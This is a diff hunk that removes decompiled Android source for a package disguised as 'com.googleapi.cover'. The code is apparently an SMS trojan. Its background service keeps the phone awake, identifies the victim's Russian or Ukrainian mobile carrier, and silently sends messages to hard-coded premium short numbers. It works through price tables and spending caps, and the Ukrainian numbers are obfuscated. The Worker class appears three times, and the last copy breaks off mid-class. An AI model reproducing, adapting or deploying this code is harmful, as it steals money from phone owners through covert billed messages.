@@ -1,1987 +1,831 @@
-Package Path:com.googleapi.cover.ActService.Worker
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-
-Package Path:com.googleapi.cover.ActService.ActService
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-public class ActService extends Service {
-    private static final double MF_LIMIT = 350.0d;
-    private static final double MTS_LIMIT = 350.0d;
-    private static String PREF_TO_USE;
-    private static boolean isStarted;
-    private PowerManager.WakeLock wakeLock;
-    public static String NUM_10 = "9865";
-    public static String NUM_5 = "9864";
-    public static String NUM_3 = "9863";
-    public static String NUM_1 = "1627";
-    public static String PREF_PLAT = "6563352";
-    public static String PREF_A1 = "7987035";
-    public static String NUM_5_A1 = "7781";
-    public static String NUM_3_A1 = "1161";
-    public static String NUM_2_A1 = "1899";
-    public static String NUM_1_A1 = "1151";
-    public static String NUM_1_ALT_A1 = "1141";
-    public static String NUM_5_SD = "8612";
-    public static String NUM_4_SD = "8611";
-    public static String NUM_3_SD = "8610";
-    public static String NUM_2_SD = "8609";
-    public static String NUM_1_SD = "8608";
-    public static String NUM_1_ALT_SD = "8607";
-    public static String NUM_1_ALT_2_SD = "8606";
-    private static ArrayList<Pair<String, Double>> mfPrices = new ArrayList<>();
-    private static ArrayList<Pair<String, Double>> mtsPrices = new ArrayList<>();
-
-    static {
-        mfPrices.add(new Pair<>(NUM_5_SD, Double.valueOf(200.0d)));
-        mfPrices.add(new Pair<>(NUM_4_SD, Double.valueOf(135.0d)));
-        mfPrices.add(new Pair<>(NUM_3_SD, Double.valueOf(100.0d)));
-        mfPrices.add(new Pair<>(NUM_2_SD, Double.valueOf(42.0d)));
-        mfPrices.add(new Pair<>(NUM_1_SD, Double.valueOf(30.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_SD, Double.valueOf(17.0d)));
-        mfPrices.add(new Pair<>(NUM_1_ALT_2_SD, Double.valueOf(3.39d)));
-        mtsPrices.add(new Pair<>(NUM_5_A1, Double.valueOf(203.2d)));
-        mtsPrices.add(new Pair<>(NUM_3_A1, Double.valueOf(111.76d)));
-        mtsPrices.add(new Pair<>(NUM_2_A1, Double.valueOf(74.51d)));
-        mtsPrices.add(new Pair<>(NUM_1_A1, Double.valueOf(42.34d)));
-        mtsPrices.add(new Pair<>(NUM_1_ALT_A1, Double.valueOf(27.09d)));
-    }
-
-    @Override // android.app.Service
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override // android.app.Service
-    public void onCreate() {
-        isStarted = false;
-        super.onCreate();
-    }
-
-    @Override // android.app.Service
-    public void onDestroy() {
-        super.onDestroy();
-        this.wakeLock.release();
-    }
-
-    @Override // android.app.Service, android.content.ComponentCallbacks
-    public void onLowMemory() {
-        super.onLowMemory();
-    }
-
-    @Override // android.app.Service
-    public void onStart(Intent intent, int startId) {
-        super.onStart(intent, startId);
-    }
-
-    @Override // android.app.Service
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (!isStarted) {
-            Worker worker = new Worker(this, null);
-            worker.start();
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativeNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_1, ActService.NUM_2_SD);
-                result.put(ActService.NUM_3, ActService.NUM_2_SD);
-                result.put(ActService.NUM_2_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_2_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, "-1");
-            }
-            return new HashMap<>(result);
-        }
-
-        private ArrayList<String> getNums(boolean isMTSRF, boolean isBeline) {
-            ArrayList<String> result = new ArrayList<>();
-            if (isMTSRF) {
-                result.add(ActService.NUM_10);
-                result.add(ActService.NUM_5);
-                result.add(ActService.NUM_3);
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            } else if (!isBeline) {
-                result.add(Actor.NUM_10);
-                result.add(Actor.NUM_10_ALT);
-                result.add(Actor.NUM_5);
-                result.add(Actor.NUM_5_ALT);
-                result.add(Actor.NUM_3);
-                result.add(Actor.NUM_3_ALT);
-                result.add(Actor.NUM_2);
-                result.add(Actor.NUM_1);
-                result.add(Actor.NUM_1_ALT);
-            } else {
-                result.add(ActService.NUM_1);
-                result.add(ActService.NUM_2_SD);
-                result.add(ActService.NUM_1_SD);
-                result.add(ActService.NUM_1_ALT_SD);
-                result.add(ActService.NUM_1_ALT_2_SD);
-            }
-            return result;
-        }
-
-        private void performActions() {
-            String lastNumber;
-            Context context = ActService.this.getApplicationContext();
-            SharedPreferences settings = context.getSharedPreferences(Main.KEY_PREFS, 0);
-            String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-            String opStr = settings.getString(Actor.NETWORK_STRING, "");
-            Actor act = new Actor(context, opStr);
-            if (act.isUkrCode()) {
-                actUK(act, settings);
-                return;
-            }
-            boolean isMTSRF = act.isMTSRF();
-            boolean isBeeline = act.isBeline();
-            if (act.isPrivate()) {
-                HashMap<String, String> positives = getPositiveNums(isBeeline, isMTSRF);
-                HashMap<String, String> negatives = getNegativeNums(isBeeline, isMTSRF);
-                int acceptedNums = 0;
-                if (isBeeline) {
-                    String currentNumber = ActService.NUM_1;
-                    ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    do {
-                        beginSending(settings, context, currentNumber, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber = positives.get(currentNumber);
-                        } else {
-                            if (currentNumber.equals(ActService.NUM_1)) {
-                                if (acceptedNums != 0) {
-                                    break;
-                                }
-                                ActService.PREF_TO_USE = Actor.PREF_PORT;
-                                positives = getAlternativePositiveNums(isBeeline, isMTSRF);
-                                negatives = getAlternativeNegativeNums(isBeeline, isMTSRF);
-                            }
-                            currentNumber = negatives.get(currentNumber);
-                        }
-                        if (currentNumber == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber.equalsIgnoreCase("-1"));
-                } else if (isMTSRF || act.isMF()) {
-                    double restAllowedSum = 0.0d;
-                    ArrayList<Pair<String, Double>> prices = new ArrayList<>();
-                    if (isMTSRF) {
-                        ActService.PREF_TO_USE = ActService.PREF_A1;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mtsPrices;
-                    } else if (act.isMF()) {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                        restAllowedSum = 350.0d;
-                        prices = ActService.mfPrices;
-                    }
-                    int currentNumberIndex = 0;
-                    while (true) {
-                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
-                            currentNumberIndex++;
-                        } else {
-                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
-                                break;
-                            }
-                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
-                            do {
-                                try {
-                                    sleep(100L);
-                                } catch (InterruptedException e2) {
-                                }
-                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                                acceptedNums++;
-                                if (acceptedNums < 3) {
-                                    smsData = act.getRelatedData(acceptedNums - 1);
-                                    waitForAcceptance(acceptedNums, settings);
-                                }
-                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
-                            } else {
-                                currentNumberIndex++;
-                            }
-                        }
-                    }
-                } else {
-                    String currentNumber2 = Actor.NUM_10;
-                    String num3_alt = Actor.NUM_3_ALT;
-                    new String();
-                    ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    do {
-                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
-                        do {
-                            try {
-                                sleep(100L);
-                            } catch (InterruptedException e3) {
-                            }
-                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                        lastNumber = currentNumber2;
-                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                            acceptedNums++;
-                            currentNumber2 = positives.get(currentNumber2);
-                        } else {
-                            currentNumber2 = negatives.get(currentNumber2);
-                        }
-                        if (currentNumber2 == null || acceptedNums > 2) {
-                            break;
-                        }
-                    } while (!currentNumber2.equalsIgnoreCase("-1"));
-                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
-                    }
-                }
-            } else {
-                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
-                for (int i = 0; i < numbers.size(); i++) {
-                    String number = numbers.get(i);
-                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
-                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
-                    } else {
-                        ActService.PREF_TO_USE = Actor.PREF_PORT;
-                    }
-                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
-                    do {
-                        try {
-                            sleep(100L);
-                        } catch (InterruptedException e4) {
-                        }
-                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
-                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
-                        break;
-                    }
-                }
-            }
-            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
-            act.reportDone();
-        }
-
-        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
-            do {
-                try {
-                    sleep(100L);
-                } catch (InterruptedException e) {
-                }
-            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
-        }
-
-        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
-            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
-            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
-            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
-            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
-        }
-
-        private void actUK(Actor act, SharedPreferences settings) {
-            SmsManager sms = SmsManager.getDefault();
-            ArrayList<String> list = new ArrayList<>();
-            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
-            String ns1ua = "31".concat("61");
-            String ns2ua = "28".concat("55");
-            String ps1_ua = "4084".concat("705");
-            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
-                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
-                    list.add(ns2ua);
-                } else if (opCode.equals("01")) {
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                } else {
-                    list.add(ns2ua);
-                    list.add(ns1ua);
-                    list.add(ns1ua);
-                }
-                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
-                for (int i = 0; i < list.size(); i++) {
-                    if (i != 0) {
-                        try {
-                            sleep(60000L);
-                        } catch (InterruptedException e) {
-                        }
-                    }
-                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
-                }
-            }
-            act.reportDone();
-        }
-    }
-}
-
-Package Path:com.googleapi.cover.ActService.Worker
-Class Name:ActService
-Content: package com.googleapi.cover;
-
-    private class Worker extends Thread {
-        private Worker() {
-        }
-
-        /* synthetic */ Worker(ActService actService, Worker worker) {
-            this();
-        }
-
-        @Override // java.lang.Thread, java.lang.Runnable
-        public void run() {
-            ActService.isStarted = true;
-            PowerManager mgr = (PowerManager) ActService.this.getSystemService("power");
-            ActService.this.wakeLock = mgr.newWakeLock(1, "WakeLock");
-            ActService.this.wakeLock.acquire();
-            performActions();
-            ActService.isStarted = false;
-            ActService.this.stopSelf();
-        }
-
-        private HashMap<String, String> getPositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_1);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, ActService.NUM_1);
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_1);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_1);
-                result.put(Actor.NUM_3_ALT, Actor.NUM_1);
-                result.put(Actor.NUM_1, "-1");
-                result.put(Actor.NUM_1_ALT, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, ActService.NUM_1);
-                    result.put(Actor.NUM_2, Actor.NUM_2);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1);
-                    result.put(Actor.NUM_1_ALT, Actor.NUM_1_ALT);
-                }
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getAlternativePositiveNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF || isBeline) {
-                result.put(ActService.NUM_2_SD, ActService.NUM_2_SD);
-                result.put(ActService.NUM_1_SD, ActService.NUM_1_SD);
-                result.put(ActService.NUM_1_ALT_SD, ActService.NUM_1_ALT_SD);
-                result.put(ActService.NUM_1_ALT_2_SD, ActService.NUM_1_ALT_2_SD);
-            }
-            return new HashMap<>(result);
-        }
-
-        private HashMap<String, String> getNegativeNums(boolean isBeline, boolean isMTSRF) {
-            TreeMap<String, String> result = new TreeMap<>();
-            if (isMTSRF) {
-                result.put(ActService.NUM_10, ActService.NUM_5);
-                result.put(ActService.NUM_5, ActService.NUM_3);
-                result.put(ActService.NUM_3, ActService.NUM_1);
-                result.put(ActService.NUM_1, "-1");
-            } else {
-                result.put(Actor.NUM_10, Actor.NUM_10_ALT);
-                result.put(Actor.NUM_10_ALT, Actor.NUM_5);
-                result.put(Actor.NUM_5, Actor.NUM_3);
-                result.put(Actor.NUM_3, Actor.NUM_3_ALT);
-                result.put(Actor.NUM_3_ALT, "-1");
-                result.put(Actor.NUM_1, "-1");
-                if (isBeline) {
-                    result.put(ActService.NUM_1, Actor.NUM_2);
-                    result.put(Actor.NUM_2, Actor.NUM_1);
-                    result.put(Actor.NUM_1, Actor.NUM_1_ALT);
-                    result.put(Actor.NUM_1_ALT, "-1");
-                }
-            }
-            return new HashMap<>(result);
-        }
-
